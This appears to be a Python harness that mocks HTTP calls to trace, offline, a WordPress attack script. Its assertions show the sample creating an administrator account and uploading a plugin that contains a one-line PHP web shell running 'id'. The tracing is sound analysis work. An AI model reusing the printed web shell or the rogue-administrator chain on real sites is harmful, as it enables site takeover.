#!/usr/bin/env python3
"""Offline execution trace; every HTTP method is replaced before loading source."""
import base64
import builtins
import contextlib
import io
import json
from pathlib import Path
import sys
import types
import zipfile


def trace(sample, module_name, early_success=False):
    calls = []

    def request(method, url, **kw):
        record = {"method": method, "url": url, **kw}
        if "files" in kw:
            filename, data = kw["files"]["plugin"]
            with zipfile.ZipFile(io.BytesIO(data)) as archive:
                record["files"] = {
                    "filename": filename,
                    "members": {n: archive.read(n).decode() for n in archive.namelist()},
                }
        calls.append(record)
        # Deliberately reject creation/upload. The client never checks these.
        if method == "POST":
            return types.SimpleNamespace(status_code=403, text="denied")
        if "/wp-content/" in url:
            return types.SimpleNamespace(status_code=200, text="uid=1000(mock)")
        return types.SimpleNamespace(status_code=200, text="user_login" if early_success else "[]")

    client = types.ModuleType("requests")
    client.get = lambda url, **kw: request("GET", url, **kw)
    client.post = lambda url, **kw: request("POST", url, **kw)
    previous = sys.modules.get("requests")
    sys.modules["requests"] = client
    builtins_map = dict(vars(builtins))
    builtins_map["open"] = lambda path, *a, **k: io.StringIO("https://example.invalid/\n")
    namespace = {"__name__": module_name, "__builtins__": builtins_map}
    output = io.StringIO()
    try:
        with contextlib.redirect_stdout(output):
            exec(compile(sample.read_bytes(), str(sample), "exec"), namespace)
    except NameError as error:
        assert "table_prefix" in str(error)
    else:
        raise AssertionError("Expected the undefined table_prefix error")
    finally:
        if previous is None:
            del sys.modules["requests"]
        else:
            sys.modules["requests"] = previous

    if module_name != "__main__":
        assert calls == []
    else:
        probes = [r for r in calls if "search" in r.get("params", {})]
        assert len(probes) == (1 if early_success else 4)
        posts = [r for r in calls if r["method"] == "POST"]
        assert len(posts) == 2 and posts[0]["json"]["roles"] == ["administrator"]
        credentials = base64.b64decode(posts[0]["headers"]["Authorization"].split()[1]).decode()
        assert credentials == posts[0]["json"]["username"] + ":" + posts[0]["json"]["password"]
        assert list(posts[1]["files"]["members"].values()) == ["<?php @system($_REQUEST['c']); ?>"]
        assert calls[-1]["params"] == {"c": "id"}
        assert "deployed 1 webshells" in output.getvalue()
    return {"module_name": module_name, "early_success": early_success,
            "calls": calls, "stdout": output.getvalue(), "exception": "NameError: table_prefix"}


if __name__ == "__main__":
    sample = Path(sys.argv[1])
    print(json.dumps([trace(sample, "review_import"), trace(sample, "__main__"),
                      trace(sample, "__main__", True)], indent=2))
